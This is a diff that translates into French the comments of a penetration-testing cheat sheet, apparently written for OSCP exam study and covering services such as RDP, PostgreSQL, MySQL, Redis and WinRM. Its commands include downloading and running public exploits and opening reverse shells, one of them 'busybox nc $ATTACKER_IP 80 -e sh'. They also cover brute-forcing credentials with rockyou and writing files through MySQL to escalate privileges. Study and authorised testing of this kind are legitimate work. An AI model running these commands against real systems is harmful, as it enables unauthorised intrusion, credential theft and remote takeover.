@@ -2121,13 +2121,13 @@ sudo mount -t nfs -o vers=<version>,nolock <target_ip>:<share> <mount_point>
 <p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
 
 ```bash
-# Connect to the service
+# Connexion au service
 nc -nv <target_ip> 3003
 
-# Get a list of available commands
+# Obtenez une liste des commandes disponibles
 help
 
-# Check the version of the CGMS service
+# Vérifiez la version du service CGMS
 version
 ```
 
@@ -2135,13 +2135,13 @@ version
 <p class="oscp-command-note">Télécharger une ressource distante.</p>
 
 ```bash
-# Download the exploit script
+# Télécharger le script d'exploitation
 wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
 
-# Run the exploit with appropriate parameters
+# Exécuter le script avec les paramètres appropriés
 python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443
 
-# Start a Netcat listener on your local machine
+# Démarrez un écouteur Netcat sur votre machine locale
 nc -nlvp 443
 ```
 
@@ -2281,13 +2281,13 @@ FLUSH PRIVILEGES;
 
 
 ```powershell
-# 1. Copy an already existing file from Windows to another location.
+# 1. Copier un fichier déjà existant depuis Windows vers un autre emplacement.
 SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
 
-# 2. Check the permissions of the new written file.
+# 2. Vérifiez les autorisations du nouveau fichier écrit.
 icacls 'C:\\xampp\htdocs\nc.exe'
 
-# An output like the one below indicates that the file was written with admin privileges, therefore the DB user has admin privilege (consider WerTrigger exploit for excalation).
+# Une sortie comme celle ci-dessous indique que le fichier a été écrit avec des privilèges d'administration, donc l'utilisateur DB a un privilège d'administration (considérez WerTrigger exploiter pour excalation).
 nc.exe WinServer\\apache:(I)(F)  
     NT AUTHORITY\\SYSTEM:(I)(F)  
     BUILTIN\\Administrators:(I)(F)  
@@ -2316,10 +2316,10 @@ hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
 <p class="oscp-command-note">Script shell dans la rubrique « 3389: RDP ».</p>
 
 ```bash
-# Using Crowbar
+# Utilisation de Crowbar
 crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt
 
-# Using CrackMapExec
+# Utilisation de CrackMapExec
 crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
 ```
 
@@ -2327,19 +2327,19 @@ crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
 <p class="oscp-command-note">Ouvrir une session RDP.</p>
 
 ```bash
-# Connect using xfreerdp with various options
+# Connectez-vous en utilisant xfreerdp avec différentes options
 xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>
 
-# Connect with a drive mapping and increased timeout
+# Connectez-vous à un mapping de lecteur et à un timeout accru
 xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>
 
-# Connect with clipboard support and set resolution
+# Connectez-vous avec le support du presse-papiers et la résolution de réglage
 xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop
 
-# Connect using rdesktop with credentials
+# Connectez-vous en utilisant rdesktop avec des identifiants
 rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
 
-# Connect using rdesktop without credentials
+# Connexion en utilisant rdesktop sans identifiants
 rdesktop <ip>
 ```
 
@@ -2373,7 +2373,7 @@ crackmapexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> -t <ip>
 
 
 ```bash
-# -W: Prompt for password
+# -W: Demander un mot de passe
 psql -h <ip> -p 5432 -U <USER> -W
 ```
 
@@ -2383,7 +2383,7 @@ psql -h <ip> -p 5432 -U <USER> -W
 ```bash
 # RCE is possible for versions: PostgreSQL DB 11.3 - 11.9
 
-# Run the exploit script to gain remote code execution
+# Exécutez le script d'exploitation pour obtenir l'exécution de code à distance
 python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 ```
 
@@ -2410,33 +2410,33 @@ DROP TABLE IF EXISTS cmd_exec;
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
-# List all databases
+# Liste toutes les bases de données
 \l
 
 # Switch to a specific database
 \c <DB_NAME>
 
-# List all tables in the current database
+# Liste de tous les tableaux de la base de données actuelle
 \dt
 
 # View the schema of a specific table
 \d <TABLE_NAME>
 
-# Query the contents of a specific table
+# Interroger le contenu d'une table spécifique
 SELECT * FROM <TABLE_NAME>;
 
-# Get detailed information about a table, including columns and their types
+# Obtenez des informations détaillées sur un tableau, y compris les colonnes et leurs types
 \d+ <TABLE_NAME>
 
-# Execute a query to find specific data, such as users with a particular attribute
+# Exécuter une requête pour trouver des données spécifiques, comme des utilisateurs avec un attribut particulier
 SELECT * FROM users WHERE attribute = 'value';
 
-# Example command to list all tables and their columns
+# Exemple de commande pour lister toutes les tables et leurs colonnes
 SELECT table_name, column_name, data_type
 FROM information_schema.columns
 WHERE table_schema = 'public';
 
-# Execute an SQL command to create a new table
+# Exécuter une commande SQL pour créer une nouvelle table
 CREATE TABLE test_table (
     id SERIAL PRIMARY KEY,
     name VARCHAR(100),
@@ -2467,10 +2467,10 @@ nmap -p 5900 --script vnc-info,vnc-auth-bypass <ip>
 <p class="oscp-command-note">Script shell dans la rubrique « 5900: VNC (Virtual Network Computing) ».</p>
 
 ```bash
-# Use vncviewer or tigervnc to connect to a VNC server
+# Utilisez vncviewer ou tigrevnc pour vous connecter à un serveur VNC
 vncviewer <ip>:5900
 
-# More detailed connection with authentication
+# Connexion plus détaillée avec l'authentification
 vncviewer -passwd /path/to/passwordfile <ip>:5900
 ```
 
@@ -2523,7 +2523,7 @@ crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 
 
 ```powershell
-# Using PowerShell to connect to WinRM
+# Utilisation de PowerShell pour se connecter à WinRM
 Enter-PSSession -ComputerName <ip> -Credential (Get-Credential)
 ```
 
@@ -2531,7 +2531,7 @@ Enter-PSSession -ComputerName <ip> -Credential (Get-Credential)
 <p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
 ```bash
-# using Kali to connect to WinRM
+# utilisant Kali pour se connecter à WinRM
 evil-winrm -i <ip> -u <USER> -p <PASSWORD>
 ```
 
@@ -2556,13 +2556,13 @@ redis-cli -h <ip> -p 6379 -a <password_to_try>
 <p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>
 
 ```bash
-# Search for known Redis vulnerabilities and exploitation techniques
+# Recherche de vulnérabilités et de techniques d'exploitation connues de Redis
 searchsploit redis
 
-# Run a Redis rogue server to capture data or execute commands
+# Exécutez un serveur Redis rogue pour capturer des données ou exécuter des commandes
 python3 redis-rogue-server.py -p 6379
 
-# Run Redis RCE exploit using a custom script (replace 'payload' with the desired payload)
+# Exécutez l'exploitation de Redis RCE à l'aide d'un script personnalisé (remplacez la charge utile souhaitée)
 python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
 ```
 
@@ -2570,15 +2570,15 @@ python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
 <p class="oscp-command-note">Interroger un serveur Redis.</p>
 
 ```bash
-# Connect to Redis server
+# Connectez-vous au serveur Redis
 redis-cli -h <ip> -p 6379
 
-# After connecting, list databases and their keys
+# Après la connexion, listez les bases de données et leurs clés
 info
 keys *
 select <db_number> # select database number (0 by default)
 
-# Example of running commands
+# Exemple de commandes en cours d'exécution
 set mykey myvalue
 get mykey
 
@@ -2595,7 +2595,7 @@ Vérifier les ports et les services de la cible autorisée.
 <p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
 
 ```bash
-# Connect to the unknown port to identify the service
+# Connectez-vous au port inconnu pour identifier le service
 nc -nv <IP> <PORT>
 ```
 
@@ -2603,7 +2603,7 @@ nc -nv <IP> <PORT>
 
 
 ```bash
-# Always list available commands or options to gather more information about the service
+# Toujours lister les commandes ou options disponibles pour recueillir plus d'informations sur le service
 help
 ```
 
@@ -2611,12 +2611,12 @@ help
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# Attempt to login with known or guessed credentials
-# You may need to replace <USERNAME> and <PASSWORD> with appropriate values
+# Tentative de connexion avec des identifiants connus ou devinés
+# Vous devrez peut-être remplacer <USERNAME> et <PASSWORD> par des valeurs appropriées.
 echo -e "<USERNAME>\n<PASSWORD>" | nc -nv <IP> <PORT>
 
-# If the service provides command options or help output, use these to guide further actions
-# For example, if the service has commands like 'list', 'status', or 'config', use those
+# Si le service fournit des options de commande ou aide à la sortie, utilisez-les pour guider d'autres actions
+# Par exemple, si le service a des commandes comme 'list', 'status' ou 'config', utilisez ces
 echo "list" | nc -nv <IP> <PORT>
 ```
 
@@ -2624,15 +2624,15 @@ echo "list" | nc -nv <IP> <PORT>
 <p class="oscp-command-note">Script shell dans la rubrique « Unkown Port ».</p>
 
 ```bash
-# After identifying the service, refer to its documentation or default command set
-# For example, if the service is a management tool, commands might include listing users or querying configurations
+# Après avoir identifié le service, référez-vous à sa documentation ou à sa commande par défaut
+# Par exemple, si le service est un outil de gestion, les commandes peuvent inclure la liste des utilisateurs ou des configurations de requête
 
-# Example commands might include:
+# Exemple de commandes peut inclure :
 # - Listing users or available configurations
-# - Executing administrative commands if applicable
-# - Gathering information about the service status or configuration
+# - Exécuter des commandes administratives le cas échéant
+# - Collecte d'informations sur l'état ou la configuration du service
 
-# Replace with appropriate commands based on the identified service and help output
+# Remplacer par des commandes appropriées basées sur le service identifié et la sortie d'aide
 ```
 
 ---
